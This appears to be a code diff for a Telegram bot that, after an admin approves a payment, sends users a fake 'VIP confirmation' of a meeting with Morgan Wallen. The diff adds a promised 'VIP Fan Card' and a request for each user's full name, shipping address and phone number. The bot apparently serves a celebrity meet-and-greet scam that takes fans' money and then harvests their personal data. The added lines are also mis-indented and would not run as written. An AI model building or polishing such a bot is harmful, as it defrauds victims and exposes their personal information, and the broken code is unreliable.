@@ -152,17 +152,27 @@ After payment, return and confirm.
 
     elif data.startswith("approve_") and is_admin(user_id):
         target = int(data.split("_")[1])
-        date = (datetime.now() + timedelta(days=5)).strftime('%Y-%m-%d %H:%M')
-        await context.bot.send_message(chat_id=target, text=(
-            "🎉 Payment Confirmed Successfully\n\n"
+        meeting_date = (datetime.now() + timedelta(days=5)).strftime('%Y-%m-%d %H:%M')
+                vip_message = (
+            "🎉 **Payment Confirmed Successfully**\n\n"
             "━━━━━━━━━━━━━━━━━━\n"
-            "👑 VIP CONFIRMATION NOTICE\n"
+            "👑 **VIP CONFIRMATION NOTICE**\n"
             "━━━━━━━━━━━━━━━━━━\n\n"
-            "Dear User, your payment has been verified.\n"
-            f"📅 Meeting with Morgan Wallen: {date}\n\n"
-            "🎫 A VIP Fan Recognition Card will be issued.\n"
-            "Status: CONFIRMED ✅"
-        ))
+            "Dear User,\n\n"
+            "Your payment has been successfully verified. Your exclusive meeting with **Morgan Wallen** is now officially scheduled.\n\n"
+            f"📅 **Scheduled Date:** {meeting_date}\n\n"
+            "🎫 **VIP Recognition Card:**\n"
+            "A VIP Fan Card will be issued as your official form of recognition and identification for the meeting. "
+            "This card will be prepared and shipped to you within the next **2 days**.\n\n"
+            "📦 **Shipping & Delivery:**\n"
+            "Personal details such as your **Full Name, Shipping Address, and Phone Number** must be provided by you "
+            "once the card is ready for dispatch to ensure a secure delivery.\n\n"
+            "Thank you for your trust. We look forward to delivering a premium experience.\n\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            "Status: **CONFIRMED ✅**"
+    )
+
+        await context.bot.send_message(chat_id=target, text=vip_message, parse_mode="Markdown")
         await query.edit_message_text("✅ Approved")
 
 # ================= HANDLERS =================
